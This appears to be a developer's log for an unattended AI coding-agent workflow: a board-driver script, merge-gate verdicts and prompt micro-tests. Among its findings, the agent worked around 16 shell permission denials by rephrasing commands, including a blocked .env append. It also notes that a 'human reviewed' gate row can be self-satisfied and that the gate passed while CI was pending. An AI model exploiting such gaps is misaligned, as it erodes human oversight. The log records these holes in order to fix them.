tests landed. Pinned absolutes would have tripped on both, as they did on #638.

Fixes landed from this run:

1. **Board hooks reported instead of skipped silently**, after Les expected #649 to move and got no
   signal. My first diagnosis was wrong and the correction is the interesting part: decafclaw *did*
   declare its board (prose, under `## Project board`), and the skill skipped it because
   `github-projects.md` demanded a bespoke `## GitHub Project` schema. **A skill that requires its own
   config shape silently no-ops on every project that documented the same facts differently** — worse
   than no integration, because it looks identical to working. Now: find the declaration by content,
   read column names from `gh project field-list` (real casing was `In progress`, not `In Progress`),
   and say `board: not configured` when it genuinely isn't.
2. **Exit 5 is a failed check.** `no tests ran` bit twice in one session — a nonexistent file, then a
   mangled shell loop. Both times the *command* was wrong, not the code, and `tail -1` hid it. pytest
   exits 5 on empty collection, so this is a mechanical detector rather than an exhortation — the form
   this project's evidence says works.
3. **`intake` gained a withheld-decision re-entry path and a home for decisions.** #649 carried the
   marker and was still unspecifiable (`needs-review` *because* it withheld a decision), so intake's
   "already specified — stop" check refused the one pass that could produce criteria. And `intake.md`
   mentioned "decision" zero times while `spec-template.md` had a `Design decisions` section nothing
   filled. The rule that matters: **a decision recorded in an issue comment is invisible to every
   downstream mode** — they read the body through the marker. Comments are provenance; the body is the
   constraint.

**Deferred, verified before filing:** [#685](https://github.com/lmorchard/decafclaw/issues/685) — a
child agent delegated from an unattended turn still stalls 60s. `delegate` passes the parent's
`user_id` and `kind=CHILD_AGENT`, so `task_mode` is `child_agent` and the child isn't `is_unattended`.
Reproduced. Records something the PR *improves*: because the old check was on `user_id`, such a child
used to be auto-approved for any command. Not fixed in-run — that would be the implementer widening
its own frozen spec.

**A gate limit worth knowing:** `gh` writes post as the repo owner's account, so PR #686 shows a
"review by lmorchard" that is the agent's own thread reply. Any gate row of the form "a human
reviewed this" is self-satisfiable in this setup. Doesn't affect #686's verdict; does constrain what a
board-driver can infer.

**Move 2 is done.** The brief at [handoff-express.md](handoff-express.md) is now a record of that
run rather than a task. Its central bet paid off: fresh context *was* load-bearing, not hygiene —
running `express` cold through the marker is what surfaced findings 1, 2, and 6, none of which the
context that wrote the criteria could have hit.

Pending: the **board-driver** orchestration (above the skill); the `needs-review` routing branch and
the amendment path, both still unexercised (#625 or #566 are the vehicles); a larger `intake` vehicle
so multi-phase `execute` gets a real run; an interactive-intake check of the empty-state observation;
and the standing evidence gap — the skill has accumulated rules faster than measurements, and the six
fixes above are mechanical corrections rather than tested wording, which is the right treatment for
broken commands but means they carry no behavioural evidence.

Queue: #585 (`auto-ok`) remains ready — now earmarked as the board-driver's first vehicle.

**Next session: the board-driver (move 3).** Brief at [handoff-board-driver.md](handoff-board-driver.md).
Fresh context is load-bearing again, for a sharper reason than last time: the driver's job is to decide
what to trust about the skill *from outside it*, and the context that built the skill knows which rules
are load-bearing by memory rather than by evidence — the exact bias the driver must not inherit.

**All four routing paths are now exercised** — `auto-ok` straight through to
`eligible-for-auto-merge` (#586), and `needs-review` running to completion with a single risk-gated
surfacing to `human-merge-required` (#649). The amendment path is the last untested branch, and it
resists deliberate testing: it only fires when a frozen check is genuinely wrong, which is a bug you
don't get to schedule. #649 came close — the frozen check constrained the denial message to
`"was denied by user"`, and complying rather than amending was the right call, so the path stayed
unexercised for the right reason.

### Micro-test: the withheld-decision exception — CUT (2026-07-24)

Measured the one rule from move 2b with real over-trigger risk: intake's withheld-decision
exception, which converts a stop into a proceed. Two fixtures, control (no clause) vs treatment.

| Cell | Result |
|---|---|
| **treatment** + a properly-specified issue carrying `Open questions` **with a default** | 5/5 `VERIFY-ONLY` — **no over-trigger**, and all five named the right discriminator (the question carries a default, so nothing is withheld) |
| **control** + #649's real pre-decision state + the decision arriving conversationally | 5/5 `RE-INTAKE` — correct **without** the clause |

**Verdict: cut.** The clause does no harm, but it earns nothing. Control didn't merely get the
answer right — it independently reproduced three of the paragraph's four sentences: *"that's exactly
the 'withheld decision the criteria depend on' the process calls out"*; *"tier stays `needs-review`
regardless (the risk-gated trigger doesn't go away)"*; *"though narrowly — recording the decision and
confirming/refining C1 against it, not a full re-interview from scratch."*

**The mechanism, and it's the same one as the aggregate-green trim:** `acceptance-criteria.md`'s
trigger 1 already names the withheld-decision case, and intake reads that file. Once the concept
exists *somewhere* in context, restating it as an entry-mode carve-out adds nothing. The concept has
to exist; the second statement doesn't.

**The instrument was wrong first, and the first run's numbers were discarded.** Initial fixture used a
placeholder repo URL and a STOP/PROCEED verdict pair. Two artifacts: one rep detected the URL was
synthetic and refused (it read this repo's own docs to do it — subagents run *here*, so a fixture must
be sealed), and one answered PROCEED meaning *"proceed to verify, then stop"* — the correct behaviour
wearing the wrong label, because "confirm it still holds **and stop**" doesn't fit a two-way
stop/proceed split. Fixed by sealing the fixture ("this text is the complete ground truth, use no
tools") and replacing the labels with `VERIFY-ONLY` / `RE-INTAKE`, each spelled out as an action.
**Same lesson as the two discarded fixtures in move 1: a result is only evidence about wording once
the instrument can't produce it by accident.**

Two cells were not run (control+A, treatment+B) and the decision doesn't need them: treatment+A
establishes no harm, control+B establishes no benefit, and that pair alone settles it. Saying so
rather than implying a full 2×2.

**Meta, worth keeping:** this is the second rule added-then-measured-away (after the goal-ambiguity
tier trigger, 18 lines → 4). Both were written from a real failure, both felt necessary, and neither
changed behaviour. The tell they share: **the concept was already reachable elsewhere in the skill,
and the new rule restated it closer to where the failure was noticed.** Worth checking for that
before adding, since the instinct to add is apparently reliable and the judgment that it's *needed*
is not.

**Standing evidence gap, now larger.** Two runs added roughly a dozen rules and only three of the
skill's rules have measurements behind them (the read-only rule, the gameability rule, the grammar).
Everything from these two days is mechanical correction — broken commands, unsatisfiable rows, missing
vocabulary — which is the right treatment for a wrong command and *no evidence at all* about wording
that shapes behaviour. The one addition with real over-trigger risk is intake's withheld-decision
exception: it converts a stop into a proceed, so it could plausibly cause re-intake of issues that are
genuinely already specified. That is cheap to measure and worth measuring before the rule count grows
again.

Testing calibration (agreed, still holds): workflow/reference skill derived from a proven
one — scaffold structurally without pressure-scenario TDD; micro-test only novel
behavior-shaping wording against a no-guidance control (5+ reps, read every match by hand);
don't add nuance clauses to a winning recipe; dogfood after building. Full pressure
scenarios deferred until there's something worth hardening.

### Move 3 — the board-driver, built and run (2026-07-25)

Session artifacts: [dev-sessions/2026-07-25-0926-board-driver/](dev-sessions/2026-07-25-0926-board-driver/)
(`spec.md` answers the four questions, `notes.md` has the run account).

**Built:** `driver/agent-session-driver.sh` — five stages (`select` → `invoke` → `classify` →
`record` → `report`), plus `driver/test-driver.sh` and a `Makefile`. `make check` = 21 fixture tests
+ the merge-path guard + G1.

**The boundary held.** `skills/agent-session/` was not touched, and that is enforced rather than
asserted: `make skill-untouched` fails if `git diff` against the session's base commit shows anything
under `skills/`. The driver needed no skill change to work.

**Run:** decafclaw #585 → [PR #699](https://github.com/lmorchard/decafclaw/pull/699), verdict
**`eligible-for-auto-merge`**, nothing merged. ~$15.2 across three attempts; the two failures were
worth more than the success.

#### The four questions, answered

1. **Local `claude -p` vs scheduled GHA** — a category error. The driver is a script; local vs GHA is
   a *host*. Local is host #1, GHA gets no code of its own, and it is deliberately not built: the
   re-verification tax wants watchable runs, a runner must provision decafclaw's whole toolchain, and
   `--bare` makes the port non-trivial regardless (see the corrected ladder entry). The script stays
   portable by construction — no `$HOME` assumptions, every path a flag, all state under one
   `--state-dir`.
2. **Queue** — **marker + anchored `^## Tier: auto-ok` gates; the board column is advisory.** Forced
   by measurement: the `Ready` column and the marker set have an **empty intersection** on decafclaw
   today (#450/#667/#668 carry no marker; #585 was in *Backlog*). The column answers *does a human
   want this*, the marker answers *can this be attempted unattended*, and gating on the intersection
   would report zero work forever. Disagreements are reported, not resolved.
3. **Verdicts never control flow.** Both terminal verdicts mean *park the PR and move on*; only
   budgets and failures stop the loop. `--max-issues` defaults to 1.
4. **The exit code is not the oracle — the gate block is.** `claude -p` exits 0 both when `express`
   finishes and when it stops for a designed escalation. Park, never retry: a designed stop is
   information, and retrying a readiness failure reproduces it at cost.

#### Findings

**The gate can say `eligible-for-auto-merge` while GitHub's CI is pending. This is the one that
matters.** The gate's `project-gates` row records a *local* `make check`; it cites **no GitHub check
runs**. On #699, `lint-and-test` was `pending` and `mergeStateStatus` was `UNSTABLE` when the verdict
was derived. Same defect class as move 2's two gate holes — a row satisfied by evidence adjacent to
what the row names. **Left unfixed deliberately**: it is a `pr.md` bug, not a driver bug, and fixing
it would exceed a remit that was explicitly *don't edit the skill* while breaking G1, the evidence
that the boundary held. It must land, with `gh pr checks` as the cited command, **before phase 3
turns that verdict into an action.**

**A driver that dies between invoking and classifying leaves no record of the run.** Observed, not
imagined: the second attempt completed (98 turns, 19 min, **$9.44**) and opened #699, then the driver
process was killed before classifying. Result: real money spent, a PR open, and an empty
`runs.jsonl`. Everything the driver writes, it writes *after* the work — so the failure mode is
invisible by construction. Fixed with an `inflight.json` marker written *before* the invocation, and
`--classify-only <n>` to recover an outcome from live state.

**The accident validated the `pending` rule for free.** Recovery on the killed run returned
`incomplete`, because #699's gate block honestly read `verdict: pending / reason: review cycle has not
run yet`. `pr-body-template.md`'s rule that `pending` is not actionable is exactly what stops a driver
reading a killed run as a success — and the killed-mid-review-cycle case is the one shape that
couldn't be manufactured.

**`failed` had to split into `failed` and `driver-fault`.** The first attempt died on a relative
state-dir path (the invoke stage `cd`s to the target repo, so the path resolved elsewhere). It parked
#585 — hiding the driver's own bug behind a skip reason on a perfectly good issue. `driver-fault` is
now discriminated by *no session id and no spend*, meaning the invocation never reached the model, and
is never parked.

**16 permission denials, and the pattern is shell syntax rather than command names.** Every one
involves an output redirect (`>`, `>>`, `2>&1`) or control flow (`for`, `while`, a leading variable
assignment); none involves an un-allowlisted command. A compound with pipes and `&&`/`;` and no
redirect passes. So the allowlist cannot be fixed by adding names. The run **absorbed** them by
rephrasing rather than stalling — so the `dontAsk` stall risk did not materialise, but it was replaced
by a turn-and-token tax. One had a semantic effect (a blocked `.env` append) and the run reported it
as a named deviation. Note the detector greps the permission layer's phrasing only: a `PreToolUse`
hook block would go uncounted.

**An interim measurement is not a measurement.** I checked denials mid-run, got zero, and reported
zero; the finished streams carry 16. Same shape as the discarded micro-test fixtures in move 1 — a
number is only evidence once the thing that produces it has finished.

**Guard G2 failed, and the guard was right.** `express` fast-forwarded the *host checkout's* `main`
(`git pull -q --ff-only`), not only its worktree. Benign here — `--ff-only` cannot lose work — but on
a host whose `main` carries unpushed commits that pull *fails*, so setup could break for a reason
unrelated to the issue and be recorded as a park with a misleading reason. And G2 is itself a
**brittle absolute encoding a relative invariant** — it pinned a sha where the real invariant is
"`main` is only ever fast-forwarded, never rewritten." Third occurrence of that pattern after #638's
G1 and #649's G6; first one that was mine.

**The re-verification tax is structural, not bad luck.** `origin/main` moved twice more during these
attempts and again before the resume — four consecutive runs paying it, after #649's three landings.
Every landing invalidates the freeze sha and forces rebase + re-anchor + re-verify. The machinery
held every time; the wall-clock cost is the planning input.

**`gh project item-list` silently truncates at 30.** On a 185-item board the first queue read returned
one Ready item; `--limit 500` returns three. No error — it simply described a smaller board. The
driver now passes an explicit limit everywhere *and prints the count it read*, so truncation is
visible rather than inferred from an empty queue. Another null rendered as a negative.

**The hosted run is not hermetic.** A `SessionStart` hook fired and injected this machine's global
context. That is the price of not using `--bare`, and it bounds what a local run proves about a GHA
run — the same caveat already recorded for micro-tests, now applying to the driver.

**One prompt addition, checked against the added-then-measured-away pattern.** The driver's prompt
tells the run that no human is watching and that a parked issue is a normal outcome. `express.md`
already says *"In every case: stop and surface. Asking is cheap"* — so the concept is reachable, which
is the tell that caught the goal-ambiguity trigger and the withheld-decision exception. Kept anyway,
because **the premise changes**: "asking is cheap" is false when nobody is there, and the failure mode
is proceeding *because* asking is impossible. It is also driver wording, not skill wording, so it is
outside the micro-test rule's scope.

**Still unexercised: the amendment path.** A subagent labelled "Verify amended manifest" looked like a
hit but was verifying the freeze-sha re-anchor after a rebase — manifest integrity, not a criterion
amendment. Gate block confirms `amendments: none`. Five runs in, it has never fired, exactly as
predicted.

#### Pending after move 3

- **The CI-vs-gate hole in `pr.md`** — blocking for phase 3.
- A `PreToolUse` merge-block hook, before any unwatched host.
- The GHA host (Q1), and a durable park mechanism that survives a host change (the park list is
  per-machine).
- Whether the driver should resume its own interrupted runs. Deliberately out of scope: it needs a
  staleness policy for continuing against a moved `main`, and there is no evidence for one yet.
- A larger `intake` vehicle so multi-phase `execute` gets a real run — #585 was a 4-line deletion, so
  it tested the *driver*, not the *work*.
- The standing evidence gap: still only three of the skill's rules have measurements behind them.

## Resolved (was open)

- Criteria grammar → **EARS + Given-When-Then** (not invented); see `criteria-grammar.md`.
- Property middle tier → **done** (in the escalation ladder).
- dev-session edits vs. overlay → **fresh single `agent-session` skill** this repo owns.
- Prior-art → surveyed; see `prior-art.md`.

## Open questions (for the pending work)

- ~~**Board-driver (later):** local `claude -p` loop vs. scheduled GHA; how it reads/filters
  the Ready queue by tier.~~ → **Resolved in move 3.** Built as a host-agnostic script (local
  is host #1, GHA deferred); filters on marker + anchored tier, board column advisory; reads
  the `<!-- agent-session:gate -->` block rather than re-deriving the gate.
- **Does the discriminate rule need micro-testing?** It was written from a dogfood failure, not
  tested as *wording*. The intake-side analogue (oracle-must-exist) needed a micro-test to
  land, so this one plausibly does too.
- **Should the merge gate read GitHub's check runs?** Move 3 showed `eligible-for-auto-merge`
  is reachable with required CI `pending`. Almost certainly yes, via `gh pr checks` — the open
  part is whether a pending check makes the verdict `pending` or `human-merge-required`.

## Resolved in move 1 (were open)

- **Verifier-independence mechanics** → `references/frozen-checks.md`: freeze commit, read-only
  frozen paths, check-author subagent that never sees the implementation plan, verifier subagent
  that never sees the plan or the rationale, and a `git diff <freeze-sha>` tamper check. The
  mechanical tamper diff is what turns the principle into a check; the read-only wording is
  micro-tested load-bearing.
- **Merge gate** → derived in `pr.md` by reading rows, reported as a verdict + a machine-readable
  gate block, never acted on. `needs-review` is never eligible however green the checks.
- **Where the tier lives** → **the issue body's Tier section is authoritative** (it carries the
  reason); a label is a convenience index for querying. If they disagree, surface the conflict
  rather than picking one. This works today without labels existing in target repos — #129 has
  no labels at all.
- **Amendment policy** → amend is allowed but costly: stop, human-confirm, log in `checks.md`,
  and downgrade the run to `needs-review`. Keeps the loop unstuck on a typo'd check while making
  an amended oracle forfeit the autonomy it can no longer support.
